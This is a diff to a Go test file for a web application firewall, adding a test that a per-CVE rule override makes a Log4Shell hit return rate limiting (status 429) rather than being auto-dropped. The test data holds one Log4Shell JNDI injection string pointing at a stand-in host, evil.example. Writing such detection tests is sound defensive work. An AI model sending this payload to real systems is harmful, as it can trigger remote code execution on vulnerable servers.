@@ -5,7 +5,9 @@ import (
 	"testing"
 
 	"My-OpenWaf/internal/core/action"
+	"My-OpenWaf/internal/core/pipeline"
 	"My-OpenWaf/internal/store"
+	"My-OpenWaf/internal/waf"
 )
 
 func TestCompileAndMatchBlockIP(t *testing.T) {
@@ -83,5 +85,30 @@ func TestMixedRulePriority(t *testing.T) {
 	// Priority 1 should come first
 	if compiled[0].Kind != "allow_ip" {
 		t.Fatalf("expected allow_ip first, got %s", compiled[0].Kind)
+	}
+}
+
+func TestCVEDetectorRuleOverridePreventsAutoDrop(t *testing.T) {
+	cfg := store.DefaultProtectionConfig()
+	cfg.CVEEnabled = true
+	cfg.CVEAction = "intercept"
+	cfg.CVEAutoDropCritical = true
+	cfg.CVEAutoDropHigh = true
+	cfg.CVERulesConfig = `{"CVE-2021-44228":{"action":"rate_limit"}}`
+
+	phase := &cvePhase{cfg: cfg, detector: waf.NewCVEDetector()}
+	result, stop := phase.Execute(&pipeline.RequestCtx{
+		Path:     "/",
+		RawQuery: "x=${jndi:ldap://evil.example/a}",
+		Headers:  map[string]string{},
+	})
+	if !stop {
+		t.Fatal("expected CVE hit to stop the pipeline")
+	}
+	if result.Type != action.RateLimit {
+		t.Fatalf("expected explicit rule action to win, got %q", result.Type)
+	}
+	if result.ResponseStatusCode() != 429 {
+		t.Fatalf("expected rate limit status 429, got %d", result.ResponseStatusCode())
 	}
 }
